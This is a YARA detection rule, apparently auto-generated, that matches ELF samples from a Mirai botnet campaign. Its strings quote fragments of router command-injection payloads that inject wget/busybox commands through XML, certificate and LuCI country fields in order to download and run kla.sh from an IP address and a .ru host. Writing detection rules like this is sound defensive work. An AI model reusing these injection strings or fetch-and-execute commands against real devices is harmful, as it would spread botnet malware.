rule Sightlines_c2_8a8868a0_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign c2-8a8868a0"
        date = "2026-11-01"
        campaign = "c2-8a8868a0"
        family = "mirai"
        hash = "488b260578daf88b078d609ef3891f2c8ebc6e698f5b16afe2e72b574e79df9d"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/c2-8a8868a0.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><language>$(cd /tmp;wget -q -O k http://193.32.162.163/bins/kl" ascii
        $s1 = "action_mode=SETROOTCERTIFICATE&cert_fname=cert.pem&cert_data=\";cd /tmp;wget -O k http://193.32.162.1" ascii
        $s2 = "/kla.sh||busybox wget -q -O k http://elliotsdog.ru/bins/kla.sh;chmod 777 k;sh k;rm -f k)</language>" ascii
        $s3 = "a.sh||wget -q -O k http://elliotsdog.ru/bins/kla.sh||busybox wget -q -O k http://193.32.162.163/bins" ascii
        $s4 = "country=;wget -O /tmp/k http://193.32.162.163/bins/kla.sh;;wget -O /tmp/k http://elliotsdog.ru/bins/" ascii
        $s5 = "POST /cgi-bin/luci/;stok=/locale?form=country HTTP/1.1" ascii
        $s6 = "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" ascii
        $s7 = "curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,diffie-hellman-" ascii
        $s8 = "kla.sh;;busybox wget -O /tmp/k http://193.32.162.163/bins/kla.sh;sh /tmp/k;" ascii
        $s9 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s10 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s11 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}
